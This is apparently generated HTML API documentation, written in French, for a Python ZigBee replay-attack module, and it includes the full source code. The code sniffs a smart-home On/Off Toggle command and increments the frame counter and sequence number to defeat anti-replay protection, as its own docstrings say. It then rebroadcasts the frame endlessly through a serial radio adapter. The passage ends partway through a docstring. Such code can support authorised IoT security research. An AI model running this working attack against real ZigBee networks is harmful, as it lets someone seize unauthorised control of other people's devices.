<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1">
<meta name="generator" content="pdoc3 0.11.5">
<title>replay API documentation</title>
<meta name="description" content="Module : zigbee_replay_attack
…">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/10up-sanitize.css/13.0.0/sanitize.min.css" integrity="sha512-y1dtMcuvtTMJc1yPgEqF0ZjQbhnc/bFhyvIyVNb9Zk5mIGtqVaAB1Ttl28su8AvFMOY0EwRbAe+HCLqj6W7/KA==" crossorigin>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/10up-sanitize.css/13.0.0/typography.min.css" integrity="sha512-Y1DYSb995BAfxobCkKepB1BqJJTPrOp3zPL74AWFugHHmmdcvO+C48WLrUOlhGMc0QG7AE3f7gmvvcrmX2fDoA==" crossorigin>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/default.min.css" crossorigin>
<style>:root{--highlight-color:#fe9}.flex{display:flex !important}body{line-height:1.5em}#content{padding:20px}#sidebar{padding:1.5em;overflow:hidden}#sidebar > *:last-child{margin-bottom:2cm}.http-server-breadcrumbs{font-size:130%;margin:0 0 15px 0}#footer{font-size:.75em;padding:5px 30px;border-top:1px solid #ddd;text-align:right}#footer p{margin:0 0 0 1em;display:inline-block}#footer p:last-child{margin-right:30px}h1,h2,h3,h4,h5{font-weight:300}h1{font-size:2.5em;line-height:1.1em}h2{font-size:1.75em;margin:2em 0 .50em 0}h3{font-size:1.4em;margin:1.6em 0 .7em 0}h4{margin:0;font-size:105%}h1:target,h2:target,h3:target,h4:target,h5:target,h6:target{background:var(--highlight-color);padding:.2em 0}a{color:#058;text-decoration:none;transition:color .2s ease-in-out}a:visited{color:#503}a:hover{color:#b62}.title code{font-weight:bold}h2[id^="header-"]{margin-top:2em}.ident{color:#900;font-weight:bold}pre code{font-size:.8em;line-height:1.4em;padding:1em;display:block}code{background:#f3f3f3;font-family:"DejaVu Sans Mono",monospace;padding:1px 4px;overflow-wrap:break-word}h1 code{background:transparent}pre{border-top:1px solid #ccc;border-bottom:1px solid #ccc;margin:1em 0}#http-server-module-list{display:flex;flex-flow:column}#http-server-module-list div{display:flex}#http-server-module-list dt{min-width:10%}#http-server-module-list p{margin-top:0}.toc ul,#index{list-style-type:none;margin:0;padding:0}#index code{background:transparent}#index h3{border-bottom:1px solid #ddd}#index ul{padding:0}#index h4{margin-top:.6em;font-weight:bold}@media (min-width:200ex){#index .two-column{column-count:2}}@media (min-width:300ex){#index .two-column{column-count:3}}dl{margin-bottom:2em}dl dl:last-child{margin-bottom:4em}dd{margin:0 0 1em 3em}#header-classes + dl > dd{margin-bottom:3em}dd dd{margin-left:2em}dd p{margin:10px 0}.name{background:#eee;font-size:.85em;padding:5px 10px;display:inline-block;min-width:40%}.name:hover{background:#e0e0e0}dt:target .name{background:var(--highlight-color)}.name > span:first-child{white-space:nowrap}.name.class > span:nth-child(2){margin-left:.4em}.inherited{color:#999;border-left:5px solid #eee;padding-left:1em}.inheritance em{font-style:normal;font-weight:bold}.desc h2{font-weight:400;font-size:1.25em}.desc h3{font-size:1em}.desc dt code{background:inherit}.source > summary,.git-link-div{color:#666;text-align:right;font-weight:400;font-size:.8em;text-transform:uppercase}.source summary > *{white-space:nowrap;cursor:pointer}.git-link{color:inherit;margin-left:1em}.source pre{max-height:500px;overflow:auto;margin:0}.source pre code{font-size:12px;overflow:visible;min-width:max-content}.hlist{list-style:none}.hlist li{display:inline}.hlist li:after{content:',\2002'}.hlist li:last-child:after{content:none}.hlist .hlist{display:inline;padding-left:1em}img{max-width:100%}td{padding:0 .5em}.admonition{padding:.1em 1em;margin:1em 0}.admonition-title{font-weight:bold}.admonition.note,.admonition.info,.admonition.important{background:#aef}.admonition.todo,.admonition.versionadded,.admonition.tip,.admonition.hint{background:#dfd}.admonition.warning,.admonition.versionchanged,.admonition.deprecated{background:#fd4}.admonition.error,.admonition.danger,.admonition.caution{background:lightpink}</style>
<style media="screen and (min-width: 700px)">@media screen and (min-width:700px){#sidebar{width:30%;height:100vh;overflow:auto;position:sticky;top:0}#content{width:70%;max-width:100ch;padding:3em 4em;border-left:1px solid #ddd}pre code{font-size:1em}.name{font-size:1em}main{display:flex;flex-direction:row-reverse;justify-content:flex-end}.toc ul ul,#index ul ul{padding-left:1em}.toc > ul > li{margin-top:.5em}}</style>
<style media="print">@media print{#sidebar h1{page-break-before:always}.source{display:none}}@media print{*{background:transparent !important;color:#000 !important;box-shadow:none !important;text-shadow:none !important}a[href]:after{content:" (" attr(href) ")";font-size:90%}a[href][title]:after{content:none}abbr[title]:after{content:" (" attr(title) ")"}.ir a:after,a[href^="javascript:"]:after,a[href^="#"]:after{content:""}pre,blockquote{border:1px solid #999;page-break-inside:avoid}thead{display:table-header-group}tr,img{page-break-inside:avoid}img{max-width:100% !important}@page{margin:0.5cm}p,h2,h3{orphans:3;widows:3}h1,h2,h3,h4,h5,h6{page-break-after:avoid}}</style>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js" integrity="sha512-D9gUyxqja7hBtkWpPWGt9wfbfaMGVt9gnyCvYa+jojwwPHLCzUm5i8rpk7vD7wNee9bA35eYIjobYPaQuKS1MQ==" crossorigin></script>
<script>window.addEventListener('DOMContentLoaded', () => {
hljs.configure({languages: ['bash', 'css', 'diff', 'graphql', 'ini', 'javascript', 'json', 'plaintext', 'python', 'python-repl', 'rust', 'shell', 'sql', 'typescript', 'xml', 'yaml']});
hljs.highlightAll();
/* Collapse source docstrings */
setTimeout(() => {
[...document.querySelectorAll('.hljs.language-python > .hljs-string')]
.filter(el => el.innerHTML.length > 200 && ['"""', "'''"].includes(el.innerHTML.substring(0, 3)))
.forEach(el => {
let d = document.createElement('details');
d.classList.add('hljs-string');
d.innerHTML = '<summary>"""</summary>' + el.innerHTML.substring(3);
el.replaceWith(d);
});
}, 100);
})</script>
</head>
<body>
<main>
<article id="content">
<header>
<h1 class="title">Module <code>replay</code></h1>
</header>
<section id="section-intro">
<h1 id="module-zigbee_replay_attack">Module : zigbee_replay_attack</h1>
<p>Ce module implémente une attaque de replay sur le réseau ZigBee.</p>
<p>Il permet de capturer des trames ZigBee, de les analyser, de les modifier et de les rejouer sur le réseau ZigBee.
Il gère également les mécanismes de protection contre les attaques de type replay et permet de personnaliser la configuration de l'attaque.</p>
<h2 id="classes">Classes</h2>
<p>ZigbeeReplayAttack: Classe principale pour effectuer l'attaque de replay.</p>
<p>Exemple d'utilisation:
&gt;&gt;&gt; from zigbee_replay_attack import ZigbeeReplayAttack
&gt;&gt;&gt; attaque = ZigbeeReplayAttack(serial_port='/dev/ttyUSB0', aes_key='ma_cle_aes')
&gt;&gt;&gt; attaque.lancer_attaque_replay(capture_live=True)</p>
</section>
<section>
</section>
<section>
</section>
<section>
</section>
<section>
<h2 class="section-title" id="header-classes">Classes</h2>
<dl>
<dt id="replay.ZigbeeReplayAttack"><code class="flex name class">
<span>class <span class="ident">ZigbeeReplayAttack</span></span>
<span>(</span><span>capture_file: str = 'captures_zigbee.json',<br>channel: int = 13,<br>pan_id: int = 6400,<br>serial_port: str | None = None,<br>aes_key: str | None = None,<br>materiel: str = 'nrf52')</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class ZigbeeReplayAttack:
    &#34;&#34;&#34;
    Classe pour effectuer une attaque de replay sur le réseau ZigBee.

    Cette classe permet de :
        - Capturer des trames ZigBee en direct ou depuis un fichier.
        - Analyser et filtrer les trames capturées.
        - Modifier certains paramètres (comme le numéro de séquence ou le compteur de trame).
        - Rejouer les trames modifiées sur le réseau ZigBee de façon répétée.

    Attributs:
        capture_file (str): Nom du fichier de capture des trames (par défaut &#39;captures_zigbee.json&#39;).
        channel (int): Canal ZigBee utilisé pour l&#39;attaque (par défaut 13).
        pan_id (int): PAN ID du réseau ZigBee (par défaut 0x1900).
        serial_port (Optional[str]): Port série pour l&#39;envoi des trames.
        aes_key (Optional[str]): Clé AES pour la sécurité des trames, si nécessaire.
        codeur (CodeurTrameZigbee): Instance de l&#39;encodeur de trame ZigBee.
        decodeur (DecodeurTrameZigbee): Instance du décodeur de trame ZigBee.
        sniffer (SniffeurZigbee): Instance pour la capture des trames.
        framefinder (ZigbeeFrameFinder): Instance pour la gestion du compteur de trame.
        captures (list): Liste des trames capturées.
        replay_queue (queue.Queue): File d&#39;attente pour la gestion des trames à rejouer.
    &#34;&#34;&#34;

    def __init__(
        self, 
        capture_file: str = &#39;captures_zigbee.json&#39;, 
        channel: int = 13, 
        pan_id: int = 0x1900,
        serial_port: Optional[str] = None,
        aes_key: Optional[str] = None,
        materiel: str = &#39;nrf52&#39;
    ):
        &#34;&#34;&#34;
    Initialise une instance d&#39;attaque par rejeu (replay attack) sur un réseau ZigBee.
    
    Cette méthode configure tous les composants nécessaires pour effectuer une attaque
    de type &#34;replay&#34; sur un réseau ZigBee. Elle initialise le sniffer, le codeur/décodeur
    de trames, et tous les paramètres essentiels à l&#39;attaque.
    
    Paramètres
    ----------
    capture_file : str, optionnel
        Chemin vers le fichier où seront enregistrées les captures. Par défaut &#39;captures_zigbee.json&#39;.
    channel : int, optionnel
        Canal ZigBee à utiliser pour la capture et l&#39;envoi des trames. Doit être compris entre 11 et 26.
        Par défaut 13.
    pan_id : int, optionnel
        Identifiant du réseau personnel (PAN ID) ZigBee cible. Par défaut 0x1900.
    serial_port : Optional[str], optionnel
        Port série utilisé pour communiquer avec l&#39;adaptateur ZigBee. Si None, une détection
        automatique sera tentée. Par défaut None.
    aes_key : Optional[str], optionnel
        Clé AES pour déchiffrer/chiffrer les trames ZigBee sécurisées. 
        Si None, les trames chiffrées ne seront pas traitées. Par défaut None.
    materiel : str, optionnel
        Type de matériel utilisé pour la capture (&#39;nrf52&#39; ou &#39;esp32h2&#39;). Par défaut &#39;nrf52&#39;.
    
    Notes
    -----
    - Le port série doit être configuré correctement pour fonctionner avec le matériel spécifié.
    - L&#39;objet ZigbeeFrameFinder est utilisé pour gérer les compteurs de trames et numéros de séquence.
    - Les instances de CodeurTrameZigbee et DecodeurTrameZigbee sont utilisées pour encoder et
      décoder les trames ZigBee.
    
    Exemple
    -------
    &gt;&gt;&gt; attaque = ZigbeeReplayAttack(
    ...     capture_file=&#39;test_capture.json&#39;,
    ...     channel=15,
    ...     serial_port=&#39;/dev/ttyUSB0&#39;,
    ...     materiel=&#39;esp32h2&#39;
    ... )
    &#34;&#34;&#34;
        self.capture_file = capture_file
        self.channel = channel
        self.pan_id = pan_id
        self.serial_port = serial_port
        self.aes_key = aes_key
        
        self.codeur = CodeurTrameZigbee(logger)
        self.decodeur = DecodeurTrameZigbee(logger)
        self.sniffer = SniffeurZigbee(
            canal=channel,
            fichier_sortie=capture_file,
            vitesse_bauds=115200,
            materiel=materiel
        )
        self.framefinder = ZigbeeFrameFinder()
        self.captures = []
        self.replay_queue = queue.Queue()

    def attendre_trame_data(self, timeout: int = 30) -&gt; Optional[str]:
        &#34;&#34;&#34;
    Capture en direct une trame ZigBee de type Data correspondant à une commande toggle.
    
    Cette méthode configure et démarre le sniffer ZigBee pour capturer les trames en temps réel.
    Elle filtre les trames capturées pour identifier spécifiquement une trame de type Data
    provenant du cluster 0x0600 (On/Off) avec un command_id de 0x02 (Toggle) et ayant une longueur
    inférieure à 100 octets. Une fois une trame correspondante trouvée, la capture est arrêtée
    et la trame est retournée sous forme hexadécimale.
    
    Paramètres
    ----------
    timeout : int, optionnel
        Durée maximale d&#39;attente en secondes avant d&#39;abandonner la recherche d&#39;une trame
        correspondante. Par défaut 30 secondes.
    
    Retourne
    --------
    Optional[str]
        La trame ZigBee capturée sous forme de chaîne hexadécimale si une trame correspondante
        est trouvée dans le délai imparti, ou None si aucune trame n&#39;est trouvée.
    
    Notes
    -----
    - La méthode réinitialise le sniffer avant de commencer la capture pour éviter 
      des interférences avec des captures précédentes.
    - Les trames de type Data ne correspondant pas aux critères sont affichées à des fins
      de diagnostic et supprimées de la liste des captures.
    - La méthode effectue un polling à intervalle régulier de 0.1 seconde pour vérifier
      les nouvelles captures.
    
    Exceptions
    ----------
    - Les exceptions KeyError lors de l&#39;accès aux attributs des trames sont attrapées et ignorées.
    - D&#39;autres exceptions potentielles (ex: problèmes de communication série) ne sont pas
      explicitement gérées par cette méthode.
    
    Exemple
    -------
    &gt;&gt;&gt; replay = ZigbeeReplayAttack(serial_port=&#39;/dev/ttyUSB0&#39;)
    &gt;&gt;&gt; trame_toggle = replay.attendre_trame_data(timeout=60)
    &gt;&gt;&gt; if trame_toggle:
    ...     print(f&#34;Trame toggle capturée: {trame_toggle}&#34;)
    ... else:
    ...     print(&#34;Aucune trame toggle n&#39;a pu être capturée dans le délai imparti.&#34;)
    &#34;&#34;&#34;
        self.sniffer.reinitialiser() 
        logger.info(&#34;Attente d&#39;une trame Toggle...&#34;)
        self.sniffer.demarrer_sniffer()
        
        start_time = time.time()
        while time.time() - start_time &lt; timeout:
            if self.sniffer.captures:
                for capture in self.sniffer.captures:
                    try:
                        
                        # Filtrage de la trame selon le type, le cluster, le command_id et la taille
                        if (capture.get(&#39;type_trame&#39;) == &#39;Data&#39; and
                            capture.get(&#39;couche_aps&#39;, {}).get(&#39;cluster_id&#39;, &#39;&#39;).lower() == &#39;0600&#39; and
                            capture.get(&#39;couche_zcl&#39;, {}).get(&#39;command_id&#39;, &#39;&#39;).lower() == &#39;02&#39;) and len(capture[&#39;metadonnees&#39;][&#39;trame_brute&#39;]) &lt; 100:
                            
                            hex_data = capture[&#39;metadonnees&#39;][&#39;trame_brute&#39;]
                            
                            # Décodage de la trame pour affichage (facultatif)
                            decode = DecodeurTrameZigbee()
                            octets = bytes.fromhex(hex_data)
                            print(decode.decoder_trame_data(octets))
                            
                            logger.info(&#34;Trame Toggle détectée&#34;)
                            
                            self.sniffer.arreter_sniffer()
                            self.sniffer.reinitialiser()
                            return hex_data
                        else:
                            # Afficher la trame si elle n&#39;est pas conforme aux critères et la supprimer
                            if capture.get(&#39;type_trame&#39;) == &#39;Data&#39; and len(capture[&#39;metadonnees&#39;][&#39;trame_brute&#39;]) &lt; 95:
                                print(capture[&#39;metadonnees&#39;][&#39;trame_brute&#39;])
                            self.sniffer.captures.remove(capture)
                    except KeyError:
                        continue
            time.sleep(0.1)
            
        self.sniffer.arreter_sniffer()
        logger.error(&#34;Timeout: Aucune trame Toggle trouvée&#34;)
        return None

    def envoyer_trames_en_boucle(self):
        &#34;&#34;&#34;
    Envoie en boucle des trames de replay modifiées sur le réseau ZigBee.
    
    Cette méthode capture d&#39;abord une trame initiale (de type toggle) en utilisant 
    `attendre_trame_data()`, puis la modifie en incrémentant progressivement certains 
    champs comme le compteur de trame et le numéro de séquence. Les trames modifiées 
    sont envoyées en continu sur le réseau ZigBee via le port série spécifié, 
    avec un délai de 3 secondes entre chaque envoi.
    
    Le processus comporte les étapes suivantes:
    1. Capture d&#39;une trame toggle initiale
    2. Suppression des 4 derniers octets (FCS) de la trame
    3. Ouverture du port série pour l&#39;envoi
    4. Pour le matériel ESP32H2, envoi d&#39;une commande pour passer en mode transmission
    5. Modification et envoi continu des trames avec incrémentation des compteurs
    
    Notes
    -----
    - La trame initiale est tronquée de ses 4 derniers octets qui correspondent au FCS 
      (Frame Check Sequence), car celui-ci sera recalculé automatiquement par l&#39;adaptateur ZigBee.
    - Les compteurs sont incrémentés à chaque itération pour contourner les protections
      anti-replay du protocole ZigBee.
    - Si aucune trame n&#39;est capturée initialement, la méthode se termine sans erreur.
    
    Exceptions
    ----------
    - Toute exception lors de l&#39;envoi d&#39;une trame spécifique est capturée, journalisée,
      et provoque l&#39;arrêt de la boucle d&#39;envoi.
    - Les exceptions de type serial.SerialException sont capturées et journalisées
      lorsqu&#39;il y a un problème avec le port série.
    
    Exemple
    -------
    &gt;&gt;&gt; replay = ZigbeeReplayAttack(serial_port=&#39;/dev/ttyUSB0&#39;)
    &gt;&gt;&gt; # La méthode s&#39;exécutera jusqu&#39;à ce qu&#39;elle soit interrompue par l&#39;utilisateur
    &gt;&gt;&gt; # ou qu&#39;une exception se produise
    &gt;&gt;&gt; replay.envoyer_trames_en_boucle()
    &#34;&#34;&#34;
        trame_initiale = self.attendre_trame_data() #&#34;6188f2eff4ffff00004818ffff00001e19a13260feffbd4d742f3c60feffbd4d74400a060004010152010202&#34;#
        if not trame_initiale:
            return
        
        # Suppression des 4 derniers octets de la trame initiale
        trame_initiale = trame_initiale[:-4]
        print(&#34;Trame initiale : &#34;, trame_initiale)
        
        try:
            with serial.Serial(self.serial_port, baudrate=115200, timeout=1) as ser:
                logger.info(f&#34;Début de l&#39;envoi sur {self.serial_port}&#34;)
                if self.sniffer.materiel == &#39;esp32h2&#39;:
                    ser.write(bytes(&#34;#CMD#MODE_TX&#34;,&#39;utf-8&#39;))
                # Modification de la trame en incrémentant le compteur de trame
                trame_modifiee = self.framefinder.increment_frame_counter(trame_initiale)
                print(&#34;Trame modifiée : &#34;, trame_modifiee)
                trame_bytes = bytes.fromhex(trame_modifiee)

                # Envoi en boucle de la trame modifiée
                while True:
                    try:
                        # Préfixe de trame (&#39;61&#39;) ajouté à la trame modifiée
                        ser.write(bytes.fromhex(&#39;61&#39;) + trame_bytes)
                        logger.debug(f&#34;Trame envoyée : {trame_bytes.hex()}&#34;)
                        time.sleep(3) 
                        print(&#34;Trame envoyée : &#34;, trame_bytes.hex())
                        
                        # Incrémentation du compteur de trame et du numéro de séquence pour la prochaine itération
                        trame_modifiee = self.framefinder.increment_frame_counter(trame_bytes.hex(), increment=1)
                        trame_modifiee = self.framefinder.increment_sequence_number(trame_modifiee, increment=1)

                        trame_bytes = bytes.fromhex(trame_modifiee)
                        print(&#34;Trame modifiée (extrait compteur) : &#34;, trame_bytes.hex()[-8:-6])
                        
                    except Exception as e:
                        logger.error(f&#34;Erreur d&#39;envoi : {e}&#34;)
                        break
        except serial.SerialException as e:
            logger.error(f&#34;Erreur port série : {e}&#34;)

    def lancer_attaque_replay(self, capture_live: bool = True):
        &#34;&#34;&#34;
    Lance l&#39;attaque de replay sur le réseau ZigBee.
    
    Cette méthode coordonne l&#39;exécution complète de l&#39;attaque par rejeu. Elle peut 
    fonctionner selon deux modes:
    1. Mode capture en direct: capture des trames en temps réel, puis rejeu
    2. Mode fichier: utilisation de trames précédemment capturées depuis un fichier
    
    Un thread dédié est créé pour exécuter la fonction `envoyer_trames_en_boucle()`,
    qui gère l&#39;envoi répété des trames modifiées. La méthode attend la fin de ce thread
    avant de se terminer.
    
    Paramètres
    ----------
    capture_live : bool, optionnel
        Si True, active le mode de capture en direct des trames à partir du réseau.
        Si False, utilise un fichier de capture existant spécifié dans l&#39;attribut `capture_file`.
        Par défaut True.
    
    Notes
    -----
    - En mode fichier (capture_live=False), la méthode tente de charger les captures 
      depuis le fichier spécifié lors de l&#39;initialisation.
    - L&#39;exécution est bloquante jusqu&#39;à la fin du thread d&#39;envoi, qui normalement
      s&#39;exécute indéfiniment jusqu&#39;à ce qu&#39;une erreur se produise ou que l&#39;utilisateur
      l&#39;interrompe manuellement.
    
    Exceptions
    ----------
    - Toute exception survenant pendant l&#39;exécution de l&#39;attaque est capturée et journalisée,
      mais n&#39;est pas propagée à l&#39;appelant.
    - Les exceptions possibles incluent les erreurs de lecture de fichier, les problèmes
      de communication série, ou les erreurs lors de la manipulation des trames.
    
    Exemple
    -------
    &gt;&gt;&gt; replay = ZigbeeReplayAttack(
    ...     serial_port=&#39;/dev/ttyUSB0&#39;,
    ...     capture_file=&#39;trames_precedentes.json&#39;
    ... )
    &gt;&gt;&gt; # Lancer l&#39;attaque avec capture en direct
    &gt;&gt;&gt; replay.lancer_attaque_replay(capture_live=True)
    &gt;&gt;&gt; 
    &gt;&gt;&gt; # Ou utiliser un fichier de capture existant
    &gt;&gt;&gt; replay.lancer_attaque_replay(capture_live=False)
    &#34;&#34;&#34;
        try:
            if capture_live:
                logger.info(&#34;Mode capture live activé&#34;)
            else:
                with open(self.capture_file, &#39;r&#39;) as f:
                    self.captures = json.load(f)

            thread_replay = threading.Thread(target=self.envoyer_trames_en_boucle)
            thread_replay.start()
            thread_replay.join()

        except Exception as e:
            logger.error(f&#34;Échec de l&#39;attaque : {e}&#34;)</code></pre>
</details>
<div class="desc"><p>Classe pour effectuer une attaque de replay sur le réseau ZigBee.</p>
<p>Cette classe permet de :
- Capturer des trames ZigBee en direct ou depuis un fichier.
- Analyser et filtrer les trames capturées.
- Modifier certains paramètres (comme le numéro de séquence ou le compteur de trame).
- Rejouer les trames modifiées sur le réseau ZigBee de façon répétée.</p>
<h2 id="attributs">Attributs</h2>
<p>capture_file (str): Nom du fichier de capture des trames (par défaut 'captures_zigbee.json').
channel (int): Canal ZigBee utilisé pour l'attaque (par défaut 13).
pan_id (int): PAN ID du réseau ZigBee (par défaut 0x1900).
serial_port (Optional[str]): Port série pour l'envoi des trames.
aes_key (Optional[str]): Clé AES pour la sécurité des trames, si nécessaire.
codeur (CodeurTrameZigbee): Instance de l'encodeur de trame ZigBee.
decodeur (DecodeurTrameZigbee): Instance du décodeur de trame ZigBee.
sniffer (SniffeurZigbee): Instance pour la capture des trames.
framefinder (ZigbeeFrameFinder): Instance pour la gestion du compteur de trame.
captures (list): Liste des trames capturées.
replay_queue (queue.Queue): File d'attente pour la gestion des trames à rejouer.</p>
<p>Initialise une instance d'attaque par rejeu (replay attack) sur un réseau ZigBee.</p>
<p>Cette méthode configure tous les composants nécessaires pour effectuer une attaque
de type "replay" sur un réseau ZigBee. Elle initialise le sniffer, le codeur/décodeur
de trames, et tous les paramètres essentiels à l'attaque.</p>
<h2 id="parametres">Paramètres</h2>
<p>capture_file : str, optionnel
Chemin vers le fichier où seront enregistrées les captures. Par défaut 'captures_zigbee.json'.
channel : int, optionnel
Canal ZigBee à utiliser pour la capture et l'envoi des trames. Doit être compris entre 11 et 26.
Par défaut 13.
pan_id : int, optionnel
Identifiant du réseau personnel (PAN ID) ZigBee cible. Par défaut 0x1900.
serial_port : Optional[str], optionnel
Port série utilisé pour communiquer avec l'adaptateur ZigBee. Si None, une détection
automatique sera tentée. Par défaut None.
aes_key : Optional[str], optionnel
Clé AES pour déchiffrer/chiffrer les trames ZigBee sécurisées.
Si None, les trames chiffrées ne seront pas traitées. Par défaut None.
materiel : str, optionnel
Type de matériel utilisé pour la capture ('nrf52' ou 'esp32h2'). Par défaut 'nrf52'.</p>
<h2 id="notes">Notes</h2>
<ul>
<li>Le port série doit être configuré correctement pour fonctionner avec le matériel spécifié.</li>
<li>L'objet ZigbeeFrameFinder est utilisé pour gérer les compteurs de trames et numéros de séquence.</li>
<li>Les instances de CodeurTrameZigbee et DecodeurTrameZigbee sont utilisées pour encoder et
décoder les trames ZigBee.</li>
</ul>
<h2 id="exemple">Exemple</h2>
<pre><code class="language-python-repl">&gt;&gt;&gt; attaque = ZigbeeReplayAttack(
...     capture_file='test_capture.json',
...     channel=15,
...     serial_port='/dev/ttyUSB0',
...     materiel='esp32h2'
... )
</code></pre></div>
<h3>Methods</h3>
<dl>
<dt id="replay.ZigbeeReplayAttack.attendre_trame_data"><code class="name flex">
<span>def <span class="ident">attendre_trame_data</span></span>(<span>self, timeout: int = 30) ‑> str | None</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def attendre_trame_data(self, timeout: int = 30) -&gt; Optional[str]:
    &#34;&#34;&#34;
Capture en direct une trame ZigBee de type Data correspondant à une commande toggle.

Cette méthode configure et démarre le sniffer ZigBee pour capturer les trames en temps réel.
Elle filtre les trames capturées pour identifier spécifiquement une trame de type Data
provenant du cluster 0x0600 (On/Off) avec un command_id de 0x02 (Toggle) et ayant une longueur
inférieure à 100 octets. Une fois une trame correspondante trouvée, la capture est arrêtée
et la trame est retournée sous forme hexadécimale.

Paramètres
----------
timeout : int, optionnel
    Durée maximale d&#39;attente en secondes avant d&#39;abandonner la recherche d&#39;une trame
    correspondante. Par défaut 30 secondes.

Retourne
--------
Optional[str]
    La trame ZigBee capturée sous forme de chaîne hexadécimale si une trame correspondante
    est trouvée dans le délai imparti, ou None si aucune trame n&#39;est trouvée.

Notes
-----
- La méthode réinitialise le sniffer avant de commencer la capture pour éviter 
  des interférences avec des captures précédentes.
- Les trames de type Data ne correspondant pas aux critères sont affichées à des fins
  de diagnostic et supprimées de la liste des captures.
- La méthode effectue un polling à intervalle régulier de 0.1 seconde pour vérifier
  les nouvelles captures.

Exceptions
----------
- Les exceptions KeyError lors de l&#39;accès aux attributs des trames sont attrapées et ignorées.
- D&#39;autres exceptions potentielles (ex: problèmes de communication série) ne sont pas
  explicitement gérées par cette méthode.

Exemple
-------
&gt;&gt;&gt; replay = ZigbeeReplayAttack(serial_port=&#39;/dev/ttyUSB0&#39;)
&gt;&gt;&gt; trame_toggle = replay.attendre_trame_data(timeout=60)
&gt;&gt;&gt; if trame_toggle:
...     print(f&#34;Trame toggle capturée: {trame_toggle}&#34;)
... else:
...     print(&#34;Aucune trame toggle n&#39;a pu être capturée dans le délai imparti.&#34;)
&#34;&#34;&#34;
    self.sniffer.reinitialiser() 
    logger.info(&#34;Attente d&#39;une trame Toggle...&#34;)
    self.sniffer.demarrer_sniffer()
    
    start_time = time.time()
    while time.time() - start_time &lt; timeout:
        if self.sniffer.captures:
            for capture in self.sniffer.captures:
                try:
                    
                    # Filtrage de la trame selon le type, le cluster, le command_id et la taille
                    if (capture.get(&#39;type_trame&#39;) == &#39;Data&#39; and
                        capture.get(&#39;couche_aps&#39;, {}).get(&#39;cluster_id&#39;, &#39;&#39;).lower() == &#39;0600&#39; and
                        capture.get(&#39;couche_zcl&#39;, {}).get(&#39;command_id&#39;, &#39;&#39;).lower() == &#39;02&#39;) and len(capture[&#39;metadonnees&#39;][&#39;trame_brute&#39;]) &lt; 100:
                        
                        hex_data = capture[&#39;metadonnees&#39;][&#39;trame_brute&#39;]
                        
                        # Décodage de la trame pour affichage (facultatif)
                        decode = DecodeurTrameZigbee()
                        octets = bytes.fromhex(hex_data)
                        print(decode.decoder_trame_data(octets))
                        
                        logger.info(&#34;Trame Toggle détectée&#34;)
                        
                        self.sniffer.arreter_sniffer()
                        self.sniffer.reinitialiser()
                        return hex_data
                    else:
                        # Afficher la trame si elle n&#39;est pas conforme aux critères et la supprimer
                        if capture.get(&#39;type_trame&#39;) == &#39;Data&#39; and len(capture[&#39;metadonnees&#39;][&#39;trame_brute&#39;]) &lt; 95:
                            print(capture[&#39;metadonnees&#39;][&#39;trame_brute&#39;])
                        self.sniffer.captures.remove(capture)
                except KeyError:
                    continue
        time.sleep(0.1)
        
    self.sniffer.arreter_sniffer()
    logger.error(&#34;Timeout: Aucune trame Toggle trouvée&#34;)
    return None</code></pre>
</details>
<div class="desc"><p>Capture en direct une trame ZigBee de type Data correspondant à une commande toggle.</p>
<p>Cette méthode configure et démarre le sniffer ZigBee pour capturer les trames en temps réel.
Elle filtre les trames capturées pour identifier spécifiquement une trame de type Data
provenant du cluster 0x0600 (On/Off) avec un command_id de 0x02 (Toggle) et ayant une longueur
inférieure à 100 octets. Une fois une trame correspondante trouvée, la capture est arrêtée
et la trame est retournée sous forme hexadécimale.</p>
<h2 id="parametres">Paramètres</h2>
<p>timeout : int, optionnel
Durée maximale d'attente en secondes avant d'abandonner la recherche d'une trame
correspondante. Par défaut 30 secondes.</p>
<h2 id="retourne">Retourne</h2>
<p>Optional[str]
La trame ZigBee capturée sous forme de chaîne hexadécimale si une trame correspondante
est trouvée dans le délai imparti, ou None si aucune trame n'est trouvée.</p>
<h2 id="notes">Notes</h2>
<ul>
<li>La méthode réinitialise le sniffer avant de commencer la capture pour éviter
des interférences avec des captures précédentes.</li>
<li>Les trames de type Data ne correspondant pas aux critères sont affichées à des fins
de diagnostic et supprimées de la liste des captures.</li>
<li>La méthode effectue un polling à intervalle régulier de 0.1 seconde pour vérifier
les nouvelles captures.</li>
</ul>
<h2 id="exceptions">Exceptions</h2>
<ul>
<li>Les exceptions KeyError lors de l'accès aux attributs des trames sont attrapées et ignorées.</li>
<li>D'autres exceptions potentielles (ex: problèmes de communication série) ne sont pas
explicitement gérées par cette méthode.</li>
</ul>
<h2 id="exemple">Exemple</h2>
<pre><code class="language-python-repl">&gt;&gt;&gt; replay = ZigbeeReplayAttack(serial_port='/dev/ttyUSB0')
&gt;&gt;&gt; trame_toggle = replay.attendre_trame_data(timeout=60)
&gt;&gt;&gt; if trame_toggle:
...     print(f&quot;Trame toggle capturée: {trame_toggle}&quot;)
... else:
...     print(&quot;Aucune trame toggle n'a pu être capturée dans le délai imparti.&quot;)
</code></pre></div>
</dd>
<dt id="replay.ZigbeeReplayAttack.envoyer_trames_en_boucle"><code class="name flex">
<span>def <span class="ident">envoyer_trames_en_boucle</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def envoyer_trames_en_boucle(self):
    &#34;&#34;&#34;
Envoie en boucle des trames de replay modifiées sur le réseau ZigBee.

Cette méthode capture d&#39;abord une trame initiale (de type toggle) en utilisant 
`attendre_trame_data()`, puis la modifie en incrémentant progressivement certains 
champs comme le compteur de trame et le numéro de séquence. Les trames modifiées 
sont envoyées en continu sur le réseau ZigBee via le port série spécifié, 
avec un délai de 3 secondes entre chaque envoi.

Le processus comporte les étapes suivantes:
1. Capture d&#39;une trame toggle initiale
2. Suppression des 4 derniers octets (FCS) de la trame
3. Ouverture du port série pour l&#39;envoi
4. Pour le matériel ESP32H2, envoi d&#39;une commande pour passer en mode transmission
